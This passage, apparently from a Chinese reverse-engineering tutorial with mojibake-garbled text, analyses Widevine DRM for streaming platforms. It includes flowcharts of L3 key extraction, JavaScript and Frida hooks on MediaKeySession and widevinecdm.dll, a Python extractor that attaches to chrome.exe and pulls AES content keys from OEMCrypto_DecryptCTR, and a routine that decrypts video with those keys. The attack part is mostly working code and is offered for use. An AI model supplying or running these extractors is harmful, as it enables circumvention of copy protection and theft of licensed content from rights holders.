    <span class="n">video_urls</span> <span class="o">=</span> <span class="p">[]</span>
    <span class="n">audio_urls</span> <span class="o">=</span> <span class="p">[]</span>

    <span class="k">for</span> <span class="n">adaptation_set</span> <span class="ow">in</span> <span class="n">root</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="s1">&#39;.//{urn:mpeg:dash:schema:mpd:2011}AdaptationSet&#39;</span><span class="p">):</span>
        <span class="n">content_type</span> <span class="o">=</span> <span class="n">adaptation_set</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;contentType&#39;</span><span class="p">)</span>

        <span class="k">for</span> <span class="n">representation</span> <span class="ow">in</span> <span class="n">adaptation_set</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="s1">&#39;.//{urn:mpeg:dash:schema:mpd:2011}Representation&#39;</span><span class="p">):</span>
            <span class="n">base_url</span> <span class="o">=</span> <span class="n">representation</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="s1">&#39;.//{urn:mpeg:dash:schema:mpd:2011}BaseURL&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">text</span>

            <span class="k">if</span> <span class="n">content_type</span> <span class="o">==</span> <span class="s1">&#39;video&#39;</span><span class="p">:</span>
                <span class="n">video_urls</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">base_url</span><span class="p">)</span>
            <span class="k">elif</span> <span class="n">content_type</span> <span class="o">==</span> <span class="s1">&#39;audio&#39;</span><span class="p">:</span>
                <span class="n">audio_urls</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">base_url</span><span class="p">)</span>

    <span class="k">return</span> <span class="n">video_urls</span><span class="p">,</span> <span class="n">audio_urls</span>
</code></pre>
      </div>

      <hr />

      <h2 id="æ¡ˆä¾‹-3-drm-ä¿æŠ¤åˆ†æ-widevine">æ¡ˆä¾‹ 3: DRM ä¿æŠ¤åˆ†æ (Widevine)</h2>

      <h3 id="èƒŒæ™¯-3">èƒŒæ™¯</h3>

      <p>Netflixã€Disney+ ç­‰å¹³å°ä½¿ç”¨ Widevine DRM ä¿æŠ¤è§†é¢‘å†…å®¹ã€‚æœ¬æ¡ˆä¾‹åˆ†æ Widevine L3 çº§åˆ«çš„å·¥ä½œåŸç†ã€‚</p>

      <h3 id="widevine-å·¥ä½œæµç¨‹">Widevine å·¥ä½œæµç¨‹</h3>

      <h4 id="eme-encrypted-media-extensions-widevine-å®Œæ•´æµç¨‹">EME (Encrypted Media Extensions) + Widevine å®Œæ•´æµç¨‹</h4>

      <pre><code>sequenceDiagram
    participant Player as ç½‘é¡µæ’­æ”¾å™¨&lt;br/&gt;(JavaScript)
    participant Browser as æµè§ˆå™¨&lt;br/&gt;(EME API)
    participant CDM as Widevine CDM&lt;br/&gt;(Content Decryption Module)
    participant License as License æœåŠ¡å™¨
    participant CDN as CDN&lt;br/&gt;(åŠ å¯†è§†é¢‘)

    Note over Player,CDN: é˜¶æ®µ 1: åˆå§‹åŒ–æ’­æ”¾

    Player-&gt;&gt;CDN: è¯·æ±‚è§†é¢‘æ–‡ä»¶ (DASH/HLS)
    CDN--&gt;&gt;Player: è¿”å› Manifest (MPD/M3U8)
    Note over Player: è§£æ Manifest&lt;br/&gt;å‘ç°åŠ å¯†ä¿¡æ¯ (PSSH)

    Player-&gt;&gt;Browser: new MediaKeys()
    Browser-&gt;&gt;CDM: åˆ›å»º CDM å®ä¾‹
    CDM--&gt;&gt;Browser: CDM åˆå§‹åŒ–å®Œæˆ
    Browser--&gt;&gt;Player: MediaKeys å¯¹è±¡

    Player-&gt;&gt;Browser: video.setMediaKeys(mediaKeys)
    Note over Browser: å°† CDM ç»‘å®šåˆ° video å…ƒç´ 

    Note over Player,CDN: é˜¶æ®µ 2: License è¯·æ±‚

    Player-&gt;&gt;Browser: session.generateRequest(initDataType, initData)
    Note over Browser: initData åŒ…å« PSSH&lt;br/&gt;(Protection System Specific Header)

    Browser-&gt;&gt;CDM: ç”Ÿæˆ License Request
    activate CDM
    Note over CDM: æ„å»º License Request:&lt;br/&gt;- è®¾å¤‡ ID&lt;br/&gt;- å®‰å…¨çº§åˆ« (L1/L3)&lt;br/&gt;- Client Capabilities
    CDM--&gt;&gt;Browser: License Request (Protobuf äºŒè¿›åˆ¶)
    deactivate CDM

    Browser--&gt;&gt;Player: message äº‹ä»¶ (License Request)

    Player-&gt;&gt;License: POST /license&lt;br/&gt;Content-Type: application/octet-stream&lt;br/&gt;[License Request äºŒè¿›åˆ¶æ•°æ®]
    Note over License: éªŒè¯è¯·æ±‚:&lt;br/&gt;1. è®¾å¤‡åˆæ³•æ€§&lt;br/&gt;2. ç”¨æˆ·æƒé™&lt;br/&gt;3. è®¢é˜…çŠ¶æ€&lt;br/&gt;4. åœ°åŒºé™åˆ¶

    Note over Player,CDN: é˜¶æ®µ 3: License å“åº”

    License-&gt;&gt;License: ç”Ÿæˆ Content Keys&lt;br/&gt;(KID + Key)
    Note over License: ä½¿ç”¨è®¾å¤‡å…¬é’¥åŠ å¯† Keys

    License--&gt;&gt;Player: License Response (Protobuf äºŒè¿›åˆ¶)

    Player-&gt;&gt;Browser: session.update(response)
    Browser-&gt;&gt;CDM: å¤„ç† License Response
    activate CDM
    Note over CDM: 1. ä½¿ç”¨è®¾å¤‡ç§é’¥è§£å¯†&lt;br/&gt;2. æå– Content Keys&lt;br/&gt;3. å­˜å‚¨åˆ°å®‰å…¨å­˜å‚¨
    CDM--&gt;&gt;Browser: Keys å®‰è£…å®Œæˆ
    deactivate CDM

    Note over Player,CDN: é˜¶æ®µ 4: è§†é¢‘æ’­æ”¾

    Player-&gt;&gt;CDN: è¯·æ±‚åŠ å¯†è§†é¢‘ç‰‡æ®µ
    CDN--&gt;&gt;Player: åŠ å¯†çš„è§†é¢‘æ•°æ®

    Player-&gt;&gt;Browser: video.play()
    Browser-&gt;&gt;CDM: è¯·æ±‚è§£å¯†è§†é¢‘æ•°æ®
    activate CDM
    Note over CDM: ä½¿ç”¨ Content Key&lt;br/&gt;è§£å¯†è§†é¢‘å¸§&lt;br/&gt;(AES-128-CTR/CBC)
    CDM--&gt;&gt;Browser: è§£å¯†åçš„è§†é¢‘å¸§
    deactivate CDM

    Browser-&gt;&gt;Browser: æ¸²æŸ“è§†é¢‘å¸§åˆ° &lt;video&gt;

    Note over Player,CDN: æ’­æ”¾ä¸­...
</code></pre>

      <h4 id="drm-å®‰å…¨çº§åˆ«å¯¹æ¯”">DRM å®‰å…¨çº§åˆ«å¯¹æ¯”</h4>

      <pre><code>graph TB
    subgraph Widevine["Widevine å®‰å…¨çº§åˆ«"]
        L1[L1 - ç¡¬ä»¶çº§å®‰å…¨&lt;br/&gt;â”â”â”â”â”â”â”â”&lt;br/&gt;â€¢ è§£å¯†åœ¨ TEE ä¸­è¿›è¡Œ&lt;br/&gt;â€¢ å¯†é’¥å­˜å‚¨åœ¨ç¡¬ä»¶&lt;br/&gt;â€¢ è§†é¢‘æ•°æ®ä¸ç»è¿‡ä¸» CPU&lt;br/&gt;â€¢ æœ€é«˜å®‰å…¨æ€§]
        L2[L2 - è½¯ä»¶åŠ å¯†, ç¡¬ä»¶è§†é¢‘&lt;br/&gt;â”â”â”â”â”â”â”â”&lt;br/&gt;â€¢ è§£å¯†åœ¨è½¯ä»¶ä¸­&lt;br/&gt;â€¢ è§†é¢‘å¤„ç†åœ¨ç¡¬ä»¶&lt;br/&gt;â€¢ ä¸­ç­‰å®‰å…¨æ€§]
        L3[L3 - çº¯è½¯ä»¶&lt;br/&gt;â”â”â”â”â”â”â”â”&lt;br/&gt;â€¢ å®Œå…¨åœ¨è½¯ä»¶ä¸­è¿è¡Œ&lt;br/&gt;â€¢ å¯†é’¥å¯è¢«æå–&lt;br/&gt;â€¢ æœ€ä½å®‰å…¨æ€§&lt;br/&gt;â€¢ å¸¸è§äºæµè§ˆå™¨]
    end

    subgraph Security["å®‰å…¨æ€§ â†“"]
        High[é«˜å®‰å…¨&lt;br/&gt;4K/HDR]
        Medium[ä¸­ç­‰å®‰å…¨&lt;br/&gt;1080p]
        Low[ä½å®‰å…¨&lt;br/&gt;720p/480p]
    end

    L1 --&gt; High
    L2 --&gt; Medium
    L3 --&gt; Low

    subgraph Attack["é€†å‘éš¾åº¦ â†“"]
        Hard[æéš¾æ”»ç ´&lt;br/&gt;éœ€è¦ç¡¬ä»¶æ¼æ´]
        Moderate[è¾ƒéš¾&lt;br/&gt;éœ€è¦ç³»ç»Ÿçº§æƒé™]
        Easy[ç›¸å¯¹å®¹æ˜“&lt;br/&gt;å†…å­˜æ‰«æ/Hook]
    end

    L1 --&gt; Hard
    L2 --&gt; Moderate
    L3 --&gt; Easy

    style L1 fill:#51cf66
    style L2 fill:#ffd43b
    style L3 fill:#ff6b6b
    style High fill:#51cf66
    style Medium fill:#ffd43b
    style Low fill:#ff6b6b
    style Hard fill:#51cf66
    style Moderate fill:#ffd43b
    style Easy fill:#ff6b6b
</code></pre>

      <h4 id="widevine-l3-å¯†é’¥æå–æµç¨‹">Widevine L3 å¯†é’¥æå–æµç¨‹</h4>

      <pre><code>flowchart TD
    Start[å¼€å§‹é€†å‘] --&gt; Identify{è¯†åˆ« DRM ç±»å‹}

    Identify --&gt;|Widevine| CheckLevel{æ£€æŸ¥å®‰å…¨çº§åˆ«}
    Identify --&gt;|PlayReady| Other1[å…¶ä»– DRM&lt;br/&gt;æµç¨‹ç±»ä¼¼]
    Identify --&gt;|FairPlay| Other2[Apple è®¾å¤‡ä¸“ç”¨]

    CheckLevel --&gt;|L1| L1Block[âŒ L1 çº§åˆ«&lt;br/&gt;ç¡¬ä»¶åŠ å¯†&lt;br/&gt;æ— æ³•æå–]
    CheckLevel --&gt;|L2| L2Block[âš ï¸ L2 çº§åˆ«&lt;br/&gt;éœ€è¦ root/è¶Šç‹±&lt;br/&gt;éš¾åº¦è¾ƒé«˜]
    CheckLevel --&gt;|L3| L3Continue[âœ… L3 çº§åˆ«&lt;br/&gt;å¯ä»¥ç»§ç»­]

    L3Continue --&gt; Method{é€‰æ‹©æå–æ–¹æ³•}

    Method --&gt;|æ–¹æ³• 1| Frida1[Frida Hook&lt;br/&gt;â”â”â”â”â”â”â”â”]
    Method --&gt;|æ–¹æ³• 2| Memory[å†…å­˜æ‰«æ&lt;br/&gt;â”â”â”â”â”â”â”â”]
    Method --&gt;|æ–¹æ³• 3| Proxy[ä»£ç†æ‹¦æˆª&lt;br/&gt;â”â”â”â”â”â”â”â”]

    Frida1 --&gt; FridaSteps[1. é™„åŠ åˆ°æµè§ˆå™¨è¿›ç¨‹&lt;br/&gt;2. Hook CDM å‡½æ•°&lt;br/&gt;3. æ‹¦æˆª DecryptCTR/CBC&lt;br/&gt;4. å¯¼å‡º Key]

    Memory --&gt; MemSteps[1. æš‚åœè§†é¢‘æ’­æ”¾&lt;br/&gt;2. æ‰«æè¿›ç¨‹å†…å­˜&lt;br/&gt;3. æœç´¢ 16 å­—èŠ‚ AES Key&lt;br/&gt;4. éªŒè¯å¯†é’¥]

    Proxy --&gt; ProxySteps[1. Hook MediaKeySession&lt;br/&gt;2. æ‹¦æˆª update äº‹ä»¶&lt;br/&gt;3. è§£æ License Response&lt;br/&gt;4. æå–åŠ å¯†çš„ Keys]

    FridaSteps --&gt; Decrypt[ä½¿ç”¨æå–çš„å¯†é’¥&lt;br/&gt;è§£å¯†è§†é¢‘]
    MemSteps --&gt; Decrypt
    ProxySteps --&gt; Decrypt

    Decrypt --&gt; Tools[è§£å¯†å·¥å…·:&lt;br/&gt;â€¢ mp4decrypt&lt;br/&gt;â€¢ ffmpeg&lt;br/&gt;â€¢ shaka-packager]

    Tools --&gt; Output[âœ… æ˜æ–‡è§†é¢‘è¾“å‡º]

    L1Block --&gt; End[æ— æ³•ç»§ç»­]
    L2Block --&gt; End
    Other1 --&gt; End
    Other2 --&gt; End

    style L1Block fill:#ff6b6b
    style L2Block fill:#ffd43b
    style L3Continue fill:#51cf66
    style Output fill:#51cf66
    style End fill:#868e96
</code></pre>

      <h3 id="é€†å‘æ­¥éª¤-3">é€†å‘æ­¥éª¤</h3>

      <h4 id="1-æŠ“åŒ…åˆ†æ-license-è¯·æ±‚">1. æŠ“åŒ…åˆ†æ License è¯·æ±‚</h4>

      <div class="codehilite">
        <pre><span></span><code><span class="c1"># License Request</span>
<span class="n">POST</span> <span class="o">/</span><span class="n">widevine</span><span class="o">/</span><span class="n">license</span> <span class="n">HTTP</span><span class="o">/</span><span class="mf">1.1</span>
<span class="n">Host</span><span class="p">:</span> <span class="n">license</span><span class="o">.</span><span class="n">example</span><span class="o">.</span><span class="n">com</span>
<span class="n">Content</span><span class="o">-</span><span class="n">Type</span><span class="p">:</span> <span class="n">application</span><span class="o">/</span><span class="n">octet</span><span class="o">-</span><span class="n">stream</span>

<span class="p">[</span><span class="n">Binary</span> <span class="n">Protobuf</span> <span class="n">Data</span><span class="p">:</span> <span class="n">License</span> <span class="n">Request</span><span class="p">]</span>
</code></pre>
      </div>

      <p><strong>License Request ç»“æ„</strong> (Protobuf):</p>

      <div class="codehilite">
        <pre><span></span><code><span class="kd">message</span><span class="w"> </span><span class="nc">LicenseRequest</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="n">ClientIdentification</span><span class="w"> </span><span class="na">client_id</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span>
<span class="w">    </span><span class="n">ContentIdentification</span><span class="w"> </span><span class="na">content_id</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">2</span><span class="p">;</span>
<span class="w">    </span><span class="kt">bytes</span><span class="w"> </span><span class="na">encrypted_client_id</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">3</span><span class="p">;</span>
<span class="p">}</span>
</code></pre>
      </div>

      <h4 id="2-javascript-hook-æ‹¦æˆª">2. JavaScript Hook æ‹¦æˆª</h4>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// Hook MediaKeySession</span>
<span class="p">(</span><span class="kd">function</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">originalGenerateRequest</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">MediaKeySession</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">generateRequest</span><span class="p">;</span>

<span class="w">    </span><span class="nx">MediaKeySession</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">generateRequest</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kd">function</span><span class="p">(</span><span class="nx">initDataType</span><span class="p">,</span><span class="w"> </span><span class="nx">initData</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;=== License Request ===&#39;</span><span class="p">);</span>
<span class="w">        </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;Init Data Type:&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">initDataType</span><span class="p">);</span>
<span class="w">        </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;Init Data:&#39;</span><span class="p">,</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nb">Uint8Array</span><span class="p">(</span><span class="nx">initData</span><span class="p">));</span>

<span class="w">        </span><span class="c1">// æ‹¦æˆª PSSH (Protection System Specific Header)</span>
<span class="w">        </span><span class="kd">const</span><span class="w"> </span><span class="nx">pssh</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nb">Uint8Array</span><span class="p">(</span><span class="nx">initData</span><span class="p">);</span>
<span class="w">        </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;PSSH:&#39;</span><span class="p">,</span><span class="w"> </span><span class="nb">Array</span><span class="p">.</span><span class="kr">from</span><span class="p">(</span><span class="nx">pssh</span><span class="p">).</span><span class="nx">map</span><span class="p">(</span><span class="nx">b</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="nx">b</span><span class="p">.</span><span class="nx">toString</span><span class="p">(</span><span class="mf">16</span><span class="p">).</span><span class="nx">padStart</span><span class="p">(</span><span class="mf">2</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;0&#39;</span><span class="p">)).</span><span class="nx">join</span><span class="p">(</span><span class="s1">&#39; &#39;</span><span class="p">));</span>

<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="nx">originalGenerateRequest</span><span class="p">.</span><span class="nx">call</span><span class="p">(</span><span class="k">this</span><span class="p">,</span><span class="w"> </span><span class="nx">initDataType</span><span class="p">,</span><span class="w"> </span><span class="nx">initData</span><span class="p">);</span>
<span class="w">    </span><span class="p">};</span>

<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">originalUpdate</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">MediaKeySession</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">update</span><span class="p">;</span>

<span class="w">    </span><span class="nx">MediaKeySession</span><span class="p">.</span><span class="nx">prototype</span><span class="p">.</span><span class="nx">update</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kd">function</span><span class="p">(</span><span class="nx">response</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;=== License Response ===&#39;</span><span class="p">);</span>
<span class="w">        </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;Response:&#39;</span><span class="p">,</span><span class="w"> </span><span class="ow">new</span><span class="w"> </span><span class="nb">Uint8Array</span><span class="p">(</span><span class="nx">response</span><span class="p">));</span>

<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="nx">originalUpdate</span><span class="p">.</span><span class="nx">call</span><span class="p">(</span><span class="k">this</span><span class="p">,</span><span class="w"> </span><span class="nx">response</span><span class="p">);</span>
<span class="w">    </span><span class="p">};</span>
<span class="p">})();</span>
</code></pre>
      </div>

      <h4 id="3-frida-hook-native-cdm">3. Frida Hook Native CDM</h4>

      <p>å¯¹äº L3 çº§åˆ«ï¼ŒContent Decryption Module åœ¨æµè§ˆå™¨è¿›ç¨‹ä¸­è¿è¡Œ:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// Frida script to hook Widevine CDM</span>
<span class="nx">Interceptor</span><span class="p">.</span><span class="nx">attach</span><span class="p">(</span><span class="nx">Module</span><span class="p">.</span><span class="nx">findExportByName</span><span class="p">(</span><span class="s1">&#39;widevinecdm.dll&#39;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;DecryptAndDecode&#39;</span><span class="p">),</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">onEnter</span><span class="o">:</span><span class="w"> </span><span class="kd">function</span><span class="p">(</span><span class="nx">args</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;DecryptAndDecode called&#39;</span><span class="p">);</span>
<span class="w">        </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;Encrypted buffer:&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">args</span><span class="p">[</span><span class="mf">0</span><span class="p">]);</span>
<span class="w">        </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;Buffer size:&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">args</span><span class="p">[</span><span class="mf">1</span><span class="p">].</span><span class="nx">toInt32</span><span class="p">());</span>
<span class="w">    </span><span class="p">},</span>
<span class="w">    </span><span class="nx">onLeave</span><span class="o">:</span><span class="w"> </span><span class="kd">function</span><span class="p">(</span><span class="nx">retval</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;Decrypted successfully:&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">retval</span><span class="p">);</span>
<span class="w">    </span><span class="p">}</span>
<span class="p">});</span>
</code></pre>
      </div>

      <h3 id="l3-å¯†é’¥æå–å·¥å…·">L3 å¯†é’¥æå–å·¥å…·</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">frida</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">sys</span>

<span class="k">class</span><span class="w"> </span><span class="nc">WidevineL3Extractor</span><span class="p">:</span>
    <span class="k">def</span><span class="w"> </span><span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">keys</span> <span class="o">=</span> <span class="p">[]</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">on_message</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">message</span><span class="p">,</span> <span class="n">data</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;å¤„ç† Frida æ¶ˆæ¯&quot;&quot;&quot;</span>
        <span class="k">if</span> <span class="n">message</span><span class="p">[</span><span class="s1">&#39;type&#39;</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;send&#39;</span><span class="p">:</span>
            <span class="n">payload</span> <span class="o">=</span> <span class="n">message</span><span class="p">[</span><span class="s1">&#39;payload&#39;</span><span class="p">]</span>
            <span class="k">if</span> <span class="s1">&#39;key&#39;</span> <span class="ow">in</span> <span class="n">payload</span><span class="p">:</span>
                <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Found key: </span><span class="si">{</span><span class="n">payload</span><span class="p">[</span><span class="s1">&#39;key&#39;</span><span class="p">]</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
                <span class="bp">self</span><span class="o">.</span><span class="n">keys</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">extract_keys</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">process_name</span><span class="o">=</span><span class="s1">&#39;chrome.exe&#39;</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;ä»æµè§ˆå™¨è¿›ç¨‹æå–å¯†é’¥&quot;&quot;&quot;</span>
        <span class="n">session</span> <span class="o">=</span> <span class="n">frida</span><span class="o">.</span><span class="n">attach</span><span class="p">(</span><span class="n">process_name</span><span class="p">)</span>

        <span class="n">script_code</span> <span class="o">=</span> <span class="s2">&quot;&quot;&quot;</span>
<span class="s2">        // Hook Widevine OEMCrypto functions</span>
<span class="s2">        var oemcrypto = Process.findModuleByName(&#39;widevinecdm.dll&#39;);</span>

<span class="s2">        if (oemcrypto) {</span>
<span class="s2">            var decrypt_func = oemcrypto.findExportByName(&#39;OEMCrypto_DecryptCTR&#39;);</span>

<span class="s2">            Interceptor.attach(decrypt_func, {</span>
<span class="s2">                onEnter: function(args) {</span>
<span class="s2">                    // args[2] is the key</span>
<span class="s2">                    var key = args[2];</span>
<span class="s2">                    var keyBuffer = Memory.readByteArray(key, 16);</span>

<span class="s2">                    send({</span>
<span class="s2">                        &#39;type&#39;: &#39;key&#39;,</span>
<span class="s2">                        &#39;key&#39;: Array.from(new Uint8Array(keyBuffer)).map(b =&gt;</span>
<span class="s2">                            b.toString(16).padStart(2, &#39;0&#39;)</span>
<span class="s2">                        ).join(&#39;&#39;)</span>
<span class="s2">                    });</span>
<span class="s2">                }</span>
<span class="s2">            });</span>
<span class="s2">        }</span>
<span class="s2">        &quot;&quot;&quot;</span>

        <span class="n">script</span> <span class="o">=</span> <span class="n">session</span><span class="o">.</span><span class="n">create_script</span><span class="p">(</span><span class="n">script_code</span><span class="p">)</span>
        <span class="n">script</span><span class="o">.</span><span class="n">on</span><span class="p">(</span><span class="s1">&#39;message&#39;</span><span class="p">,</span> <span class="bp">self</span><span class="o">.</span><span class="n">on_message</span><span class="p">)</span>
        <span class="n">script</span><span class="o">.</span><span class="n">load</span><span class="p">()</span>

        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;Waiting for keys... (play some DRM content)&quot;</span><span class="p">)</span>
        <span class="n">sys</span><span class="o">.</span><span class="n">stdin</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>

        <span class="k">return</span> <span class="bp">self</span><span class="o">.</span><span class="n">keys</span>

<span class="c1"># ä½¿ç”¨ç¤ºä¾‹</span>
<span class="n">extractor</span> <span class="o">=</span> <span class="n">WidevineL3Extractor</span><span class="p">()</span>
<span class="n">keys</span> <span class="o">=</span> <span class="n">extractor</span><span class="o">.</span><span class="n">extract_keys</span><span class="p">(</span><span class="s1">&#39;chrome.exe&#39;</span><span class="p">)</span>

<span class="c1"># ä½¿ç”¨æå–çš„å¯†é’¥è§£å¯†è§†é¢‘</span>
<span class="k">for</span> <span class="n">key_info</span> <span class="ow">in</span> <span class="n">keys</span><span class="p">:</span>
    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;KID: </span><span class="si">{</span><span class="n">key_info</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;kid&#39;</span><span class="p">,</span><span class="w"> </span><span class="s1">&#39;N/A&#39;</span><span class="p">)</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Key: </span><span class="si">{</span><span class="n">key_info</span><span class="p">[</span><span class="s1">&#39;key&#39;</span><span class="p">]</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
</code></pre>
      </div>

      <h3 id="ä½¿ç”¨å¯†é’¥è§£å¯†è§†é¢‘">ä½¿ç”¨å¯†é’¥è§£å¯†è§†é¢‘</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="kn">from</span><span class="w"> </span><span class="nn">Crypto.Cipher</span><span class="w"> </span><span class="kn">import</span> <span class="n">AES</span>

<span class="k">def</span><span class="w"> </span><span class="nf">decrypt_video_with_key</span><span class="p">(</span><span class="n">encrypted_file</span><span class="p">,</span> <span class="n">output_file</span><span class="p">,</span> <span class="n">key_hex</span><span class="p">,</span> <span class="n">iv_hex</span><span class="o">=</span><span class="kc">None</span><span class="p">):</span>
<span class="w">    </span><span class="sd">&quot;&quot;&quot;ä½¿ç”¨æå–çš„å¯†é’¥è§£å¯†è§†é¢‘&quot;&quot;&quot;</span>
    <span class="n">key</span> <span class="o">=</span> <span class="nb">bytes</span><span class="o">.</span><span class="n">fromhex</span><span class="p">(</span><span class="n">key_hex</span><span class="p">)</span>

    <span class="k">if</span> <span class="n">iv_hex</span><span class="p">:</span>
        <span class="n">iv</span> <span class="o">=</span> <span class="nb">bytes</span><span class="o">.</span><span class="n">fromhex</span><span class="p">(</span><span class="n">iv_hex</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="c1"># é»˜è®¤ IV (å…¨ 0)</span>
        <span class="n">iv</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span> <span class="o">*</span> <span class="mi">16</span>

    <span class="n">cipher</span> <span class="o">=</span> <span class="n">AES</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="n">AES</span><span class="o">.</span><span class="n">MODE_CTR</span><span class="p">,</span> <span class="n">nonce</span><span class="o">=</span><span class="n">iv</span><span class="p">[:</span><span class="mi">8</span><span class="p">],</span> <span class="n">initial_value</span><span class="o">=</span><span class="nb">int</span><span class="o">.</span><span class="n">from_bytes</span><span class="p">(</span><span class="n">iv</span><span class="p">[</span><span class="mi">8</span><span class="p">:],</span> <span class="s1">&#39;big&#39;</span><span class="p">))</span>

    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">encrypted_file</span><span class="p">,</span> <span class="s1">&#39;rb&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f_in</span><span class="p">:</span>
        <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">output_file</span><span class="p">,</span> <span class="s1">&#39;wb&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f_out</span><span class="p">:</span>
            <span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
                <span class="n">chunk</span> <span class="o">=</span> <span class="n">f_in</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="mi">64</span> <span class="o">*</span> <span class="mi">1024</span><span class="p">)</span>
                <span class="k">if</span> <span class="ow">not</span> <span class="n">chunk</span><span class="p">:</span>
                    <span class="k">break</span>
                <span class="n">decrypted_chunk</span> <span class="o">=</span> <span class="n">cipher</span><span class="o">.</span><span class="n">decrypt</span><span class="p">(</span><span class="n">chunk</span><span class="p">)</span>
                <span class="n">f_out</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">decrypted_chunk</span><span class="p">)</span>

<span class="c1"># ä½¿ç”¨ç¤ºä¾‹</span>
<span class="n">decrypt_video_with_key</span><span class="p">(</span>
    <span class="s1">&#39;encrypted_video.mp4&#39;</span><span class="p">,</span>
    <span class="s1">&#39;decrypted_video.mp4&#39;</span><span class="p">,</span>
    <span class="n">key_hex</span><span class="o">=</span><span class="s1">&#39;0123456789abcdef0123456789abcdef&#39;</span>
<span class="p">)</span>
</code></pre>
      </div>

      <h3 id="æ³¨æ„äº‹é¡¹">æ³¨æ„äº‹é¡¹</h3>

      <ul>
